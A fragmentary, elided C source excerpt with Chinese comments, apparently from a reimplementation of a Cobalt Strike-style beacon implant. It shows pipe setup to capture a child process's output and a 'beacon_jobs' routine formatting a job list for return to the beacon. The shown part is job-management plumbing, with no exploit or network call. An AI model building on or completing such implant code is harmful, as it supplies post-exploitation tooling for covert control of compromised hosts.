...
CreatePipeJob createPipeJob() {
    CreatePipeJob jobError = { NULL }; // 初始化结构体
    BOOL bRet = FALSE;
    ...
    securityAttributes.bInheritHandle = TRUE;    // 允许句柄继承 父进程通过 hReadPipe 读取子进程产生的数据
    ...
    si.hStdError = hWritePipe;  // 标准错误重定向
    si.hStdOutput = hWritePipe; // 标准输出重定向
    CreatePipeJob CreatePipeJob;
    CreatePipeJob.si = si;
...
void beacon_jobs() {
    ...
    // 初始化格式化输出
    BeaconFormatAlloc(&formatp, 0x8000);

    // 遍历任务列表，格式化输出
    while (pBeaconJob) {
        BeaconFormatPrintf(&formatp, "%d\t%d\t%s\n", pBeaconJob->JobNumber, pBeaconJob->JobProcessPid, pBeaconJob->JobName);
        pBeaconJob = pBeaconJob->Linked;
    }

    // 获取格式化输出的长度和指针
    int length = BeaconFormatLength(&formatp);
    char* buffer = BeaconFormatOriginal(&formatp);

    // 发送格式化输出给 Beacon

    // 原始字符串（长度 23 + \0 = 24）
    const char header[] = "JID\tPID\tDescription\n";
    const char separator[] = "---\t---\t-----------\n";

    // 初始化 uint8_t 数组（大小匹配）
    uint8_t id[sizeof(header)];
    uint8_t xiahua[sizeof(separator)];

    memcpy(id, header, sizeof(header));
    memcpy(xiahua, separator, sizeof(separator));
